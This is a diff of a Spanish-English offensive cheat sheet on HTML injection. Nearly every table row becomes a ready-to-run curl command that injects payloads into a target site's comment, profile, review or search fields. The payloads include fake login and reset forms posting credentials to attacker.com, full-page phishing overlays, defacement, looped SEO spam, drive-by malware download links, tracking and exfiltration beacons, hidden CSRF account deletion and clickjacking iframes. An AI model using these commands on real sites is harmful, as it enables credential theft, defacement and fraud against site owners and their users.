@@ -24,17 +24,15 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Fake login form | `<form action="https://attacker.com/log" method="POST"><input name="user"><input name="pass" type="password"><button>Login</button></form>` | Captures creds. |
-| Fake reset password | `<form action="//attacker"><input name="email"></form>` | Same UX. |
-| Form override existing | Insert form encima del legit (CSS positioning) | Stealth. |
-| Logout-then-login pattern | `<a href="/logout">Click</a>` triggers logout, atacante's domain takes over | Multi-step. |
-| Embedded login overlay | `<div style="position:fixed;top:0;...">FAKE LOGIN</div>` | Visual layer. |
-| Action attribute external | `<form action="https://evil.com/log">` con stolen UI | Standard. |
-| HTTPS fake form on HTTP page | Mixed content sometimes | Edge. |
-| Dynamic form via SVG | `<svg><foreignObject>...</foreignObject></svg>` | If SVG allowed. |
-| Combine con CSS | Hide app UI con CSS, show fake | Custom phishing. |
-| Method override | `<form method="POST"><input name="_method" value="DELETE">...</form>` | Combine CSRF. |
-| File upload phishing | `<input type="file">` UI + sumitted to atacante | Captura archivos. |
+| `curl -X POST -d 'comment=<form action="https://attacker.com/log" method="POST"><input name="user"><input name="pass" type="password"><button>Login</button></form>' https://target/comments` | Inject fake login form — capture creds | Comment fields. |
+| `curl -X POST -d 'bio=<form action="//attacker.com/reset" method="POST"><input name="email"></form>' https://target/profile` | Fake reset password form | Profile bio. |
+| `curl 'https://target/search?q=<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><form action="//attacker"><input name=u placeholder=Email><input name=p type=password placeholder=Password><button>Re-login</button></form></div>'` | Full-page overlay phishing | Reflected XSS context. |
+| `curl -X POST -d 'review=<a href="/logout">Click here</a><form action="//attacker" method="POST"><input name=u><input name=p type=password></form>' https://target/reviews` | Logout-then-fake-login chain | Multi-step UX. |
+| `curl -X POST -d 'desc=<svg><foreignObject width=300 height=200><form xmlns="http://www.w3.org/1999/xhtml" action="//attacker"><input name=p type=password></form></foreignObject></svg>' https://target/items` | SVG foreignObject form bypass | SVG allowed. |
+| `curl 'https://target/?msg=<form method=POST action=//attacker><input name=_method value=DELETE><input name=user>'` | Method override + form | Method-override apps. |
+| `curl -X POST -d 'note=<form action=//attacker enctype=multipart/form-data method=POST><input type=file name=f><button>Upload</button></form>' https://target/notes` | File upload phishing form | File harvest. |
+| `curl 'https://target/search?q=<form action="https://attacker.com" id=x><input name=email></form><label for=email>...'` | Form by id reference outside form tag | HTML5 form ownership. |
+| Burp Repeater inject `<form action="//attacker"...` en cualquier reflected param | Manual probe phishing inject | Workflow. |
 ^htmli-vector-phishing
 
 ### Phishing PoC en comment field
@@ -53,26 +51,22 @@ linked:
 </div>
 ```
 
-Si commento aparece en pages publicas, todos los users ven fake login.
-
 ___
 
 ## Defacement / Page Modification
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Insert offensive content | `<h1 style="color:red">DEFACED</h1>` | Standard defacement. |
-| Replace logo | `<img src="https://attacker/troll.png" style="position:absolute;top:0;...">` | Visual replace. |
-| Insert ad / promo | `<div style="...">Click here for FREE BITCOIN!</div>` | Monetization vector. |
-| Hide legit content | `<style>.legit-content { display:none; }</style>` | CSS hide. |
-| Inject background music | `<audio src="evil.mp3" autoplay loop>` | Annoyance. |
-| Inject video | `<video src="evil.mp4" autoplay>` | Same. |
-| Inject offensive iframe | `<iframe src="https://evil.com" style="width:100%;height:100%;">` | Full page replace. |
-| Style sheet injection | `<style>* { color: red; }</style>` | Visual chaos. |
-| Animation defacement | CSS animations | Distracting. |
-| Multi-element insert | Múltiples tags simultáneos | Bulk defacement. |
-| Persistent defacement | Stored injection visible always | High impact. |
-| Per-region defacement | Use language detection a serve diferente | Targeted. |
+| `curl -X POST -d 'comment=<h1 style="color:red;font-size:80px">DEFACED BY X</h1>' https://target/comments` | Standard defacement banner | Stored field. |
+| `curl -X POST -d 'bio=<img src="https://attacker.com/troll.png" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999">' https://target/profile` | Full-page image overlay | Visual replace. |
+| `curl -X POST -d 'content=<style>.legit-content,nav,header,main{display:none!important}</style><div>OWNED</div>' https://target/post` | CSS hide legit + show defaced | Stealth defacement. |
+| `curl 'https://target/search?q=<audio src="https://attacker.com/loop.mp3" autoplay loop></audio>'` | Autoplay audio loop | Annoyance. |
+| `curl 'https://target/?msg=<video src="//attacker.com/v.mp4" autoplay style="width:100%"></video>'` | Inject autoplay video | Same. |
+| `curl -X POST -d 'review=<iframe src="https://attacker.com/page" style="position:fixed;top:0;left:0;width:100%;height:100%;border:0;z-index:9999"></iframe>' https://target/reviews` | Full-page iframe replace | Iframe replace. |
+| `curl -X POST -d 'comment=<style>*{color:red!important;background:black!important;transform:rotate(180deg)}</style>' https://target/comments` | Style chaos | Visual chaos. |
+| `curl -X POST -d 'note=<style>body{animation:shake 0.5s infinite}@keyframes shake{0%{transform:translateX(0)}50%{transform:translateX(10px)}}</style>' https://target/notes` | CSS animation distract | Distract. |
+| `curl 'https://target/?lang=es&msg=<h1>HACKEADO</h1>'` (lang-targeted) | Per-language defacement | Multi-region. |
+| `curl -X POST -d 'comment=<style>body::before{content:"DEFACED";position:fixed;top:0;left:0;width:100vw;background:red;color:white;font-size:60px;z-index:9999}</style>' https://target/comments` | CSS ::before pseudo-element | CSS-only inject. |
 ^htmli-vector-deface
 
 ___
@@ -81,17 +75,17 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Inject SEO spam links | `<a href="https://spam.com">Buy Pills</a>` × N | Search engine ranking abuse. |
-| Hidden links | `<a href="..." style="display:none;">x</a>` | Invisible to user pero crawled. |
-| Link bait phishing | `<a href="https://target.com.evil.com">Login</a>` | Lookalike domain. |
-| Fake reset link | `<a href="https://evil.com/fake-reset">Reset password</a>` | Phishing destination. |
-| Link rel SEO abuse | `<link rel="canonical" href="https://evil.com">` | SEO redirect (if rendered head). |
-| `nofollow` bypass | Insert links sin nofollow attr | Ignored by app filter. |
-| Mass spam injection | Múltiples links en single field | Bulk spam. |
-| Cloaked links | `<a href="https://evil.com">https://target.com</a>` | Display vs href mismatch. |
-| Anchor para download | `<a href="malware.exe">click</a>` | Drive-by download. |
-| Tel/mailto links | `<a href="tel:+1xxx">call us</a>` | Vishing. |
-| Mixed content | Insert links to attacker en legit page | Trust transfer. |
+| `for url in spam1 spam2 spam3; do curl -X POST -d "comment=<a href='https://$url.com'>Buy Pills Cheap</a>" https://target/comments; done` | Mass SEO spam link injection | Crawler SEO abuse. |
+| `curl -X POST -d 'review=<a href="https://spam.com" style="display:none;visibility:hidden">x</a>' https://target/reviews` | Hidden SEO link invisible to user | Crawler-only. |
+| `curl -X POST -d 'comment=<a href="https://target.com.attacker.com/login">target.com Login</a>' https://target/comments` | Lookalike domain phishing link | Visual confusion. |
+| `curl -X POST -d 'comment=<a href="https://attacker.com/fake-reset">Reset Password</a>' https://target/comments` | Fake reset link phishing | Phishing destination. |
+| `curl 'https://target/?head=<link rel="canonical" href="https://attacker.com">'` (if head reflected) | SEO canonical hijack | Head context. |
+| `curl -X POST -d 'comment=<a href="https://attacker.com/page" rel="">link</a>' https://target/comments` | Bypass nofollow filter via empty rel | Filter bypass. |
+| `curl -X POST -d 'comment=<a href="https://attacker.com">https://target.com/legit-page</a>' https://target/comments` | Cloaked display vs href mismatch | Trust transfer. |
+| `curl -X POST -d 'comment=<a href="https://attacker.com/malware.exe" download>Download Report</a>' https://target/comments` | Drive-by download link | Drive-by. |
+| `curl -X POST -d 'comment=<a href="tel:+1-555-0100">Call Support Now</a>' https://target/comments` | tel: vishing link | Vishing. |
+| `curl -X POST -d 'comment=<a href="mailto:victim@target.com?subject=Reset&body=Password:">Click</a>' https://target/comments` | Pre-filled mailto phishing | Email phish. |
+| `for i in {1..50}; do curl -X POST -d "comment=<a href=https://spam$i.com>buy</a>" https://target/comments; done` | Bulk spam mass injection | Volume. |
 ^htmli-vector-seo
 
 ___
@@ -100,18 +94,17 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Misleading text | `<h2>Special offer for you!</h2>` | UX confusion. |
-| Fake notifications | `<div class="alert">Your account is locked!</div>` | Panic UX. |
-| Counter injection | `<span style="font-size:50px">999</span>` views | Fake metrics. |
-| Highlight text | `<mark>HIGHLIGHTED</mark>` | Attention. |
-| Marquee | `<marquee>SPAM</marquee>` | Legacy moving text. |
-| Iframe overlay | `<iframe>` con malicious | Standard. |
-| Pre-formatted text | `<pre>` with ASCII art | Visual. |
-| Inject error messages | `<div class="error">Account hacked, click here</div>` | Phishing UX. |
-| Clickbait button | `<button onclick="...">CLAIM NOW</button>` con event (XSS) | Combine vectors. |
-| Survey injection | Insert fake survey | Data harvest. |
-| Comment quote injection | `<blockquote>FAKE QUOTE</blockquote>` | Attribution forgery. |
-| Counterfeit reviews | `<div>5 stars - Atacante</div>` | Fraud. |
+| `curl -X POST -d 'review=<h2 style="color:red">Special offer just for you — click below!</h2>' https://target/reviews` | Misleading promotional text | UX confusion. |
+| `curl -X POST -d 'comment=<div class="alert alert-danger">Your account was locked. <a href="//attacker">Verify here</a></div>' https://target/comments` | Fake security alert UX | Panic-driven phish. |
+| `curl -X POST -d 'bio=<span style="font-size:50px;color:gold">⭐⭐⭐⭐⭐ Verified Seller</span>' https://target/profile` | Fake verified badge | Fraud trust. |
+| `curl -X POST -d 'review=<mark style="background:yellow;padding:20px">URGENT: Action required</mark>' https://target/reviews` | Highlighted attention grab | Attention. |
+| `curl -X POST -d 'comment=<marquee scrollamount=30>BUY NOW BUY NOW BUY NOW</marquee>' https://target/comments` | Legacy marquee scroll | Distraction. |
+| `curl -X POST -d 'comment=<iframe src="https://attacker.com/scam" width=600 height=400 style="border:0"></iframe>' https://target/comments` | Embedded malicious iframe | Iframe abuse. |
+| `curl -X POST -d 'note=<pre style="font-family:monospace;color:red">SYSTEM BREACH DETECTED\nCall +1-555-0100 immediately</pre>' https://target/notes` | Pre-formatted scare ASCII | Scare phish. |
+| `curl -X POST -d 'comment=<div class="error" style="border:2px solid red;padding:10px;background:#fdd">Your session was compromised. <a href="//attacker">Verify identity</a></div>' https://target/comments` | Fake error message | Phish UX. |
+| `curl -X POST -d 'review=<blockquote cite="CEO">target.com is a scam company</blockquote>' https://target/reviews` | Attribution forgery blockquote | Reputation. |
+| `curl -X POST -d 'review=<div>5 stars - Best product! - Verified Customer</div>' https://target/reviews` | Counterfeit fake review | Fraud. |
+| `curl -X POST -d 'comment=<span style="font-size:80px;background:red;color:white">999</span> people online' https://target/comments` | Fake counter metrics | Fake metrics. |
 ^htmli-vector-content
 
 ___
@@ -120,18 +113,18 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Hidden iframe | `<iframe src="https://attacker" style="display:none">` | Background actions. |
-| Hidden form | `<form style="display:none" action="..." onload="...">` | Auto-submit form. |
-| Tracking pixel | `<img src="https://attacker/track" width="1" height="1" style="display:none">` | User tracking. |
-| Clickjacking via iframe | `<iframe src="legit-action" style="opacity:0">` | UI redress. |
-| 1x1 invisible iframe | `<iframe src="..." width="1" height="1">` | Invisible action. |
-| CSRF via auto-submit | `<form id="x" action="legit/action">...</form><script>document.getElementById('x').submit()</script>` | XSS chain. |
-| Fetch via image | `<img src="//attacker/?cookie=...">` (won't read cookies but logs Referer) | Referer leak. |
-| `<base>` href hijack | `<base href="https://attacker.com/">` overrides relative URLs | All assets routed via attacker. |
-| Background redirect | `<meta http-equiv="refresh" content="0;url=https://evil.com">` | Auto-redirect. |
-| Hidden svg | SVG con onload event si XSS allowed | Combo. |
-| `onerror` on broken img | `<img src="bad" onerror="...">` | XSS combo. |
-| Conditional comments | `<!--[if IE]>...<![endif]-->` legacy IE | Edge case. |
+| `curl -X POST -d 'comment=<iframe src="https://attacker.com/c2" style="display:none"></iframe>' https://target/comments` | Hidden iframe persistent background | Background actions. |
+| `curl -X POST -d 'comment=<form id="x" style="display:none" action="//target.com/account/delete" method="POST"><input name="confirm" value="yes"></form><script>document.getElementById("x").submit()</script>' https://target/comments` | Hidden auto-submit form CSRF (XSS chain) | CSRF chain. |
+| `curl -X POST -d 'comment=<img src="https://attacker.com/track?u=USER" width=1 height=1 style="display:none">' https://target/comments` | 1x1 tracking pixel | User tracking. |
+| `curl -X POST -d 'comment=<iframe src="https://target.com/account/delete?confirm=yes" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;z-index:9999"></iframe>' https://target/comments` | Clickjacking iframe overlay | UI redress. |
+| `curl -X POST -d 'comment=<iframe src="https://attacker.com" width=1 height=1></iframe>' https://target/comments` | 1x1 invisible iframe | Invisible. |
+| `curl -X POST -d 'comment=<img src="//attacker.com/log?path='$(echo /admin)'&cookies=NA">' https://target/comments` | Image src Referer leak token-bearing URL | Referer leak. |
+| `curl 'https://target/?msg=<base href="https://attacker.com/">'` (head context) | base href hijack reroute relative URLs | Asset hijack. |
+| `curl 'https://target/?msg=<meta http-equiv="refresh" content="0;url=https://attacker.com">'` | Meta refresh auto-redirect | Auto-redirect. |
+| `curl -X POST -d 'comment=<svg width=0 height=0><image href="https://attacker.com/log?url='$URL'" /></svg>' https://target/comments` | SVG hidden image exfil | SVG combo. |
+| `curl -X POST -d 'comment=<link rel="prefetch" href="https://attacker.com/log?u=USER">' https://target/comments` | Link prefetch background request | Prefetch exfil. |
+| `curl -X POST -d 'comment=<picture><source srcset="https://attacker.com/log"><img src="x"></picture>' https://target/comments` | Picture srcset exfil | Source variant. |
+| `curl -X POST -d 'comment=<object data="https://attacker.com/page" width=0 height=0></object>' https://target/comments` | Object tag hidden load | Object embed. |
 ^htmli-vector-hidden
 
 ***
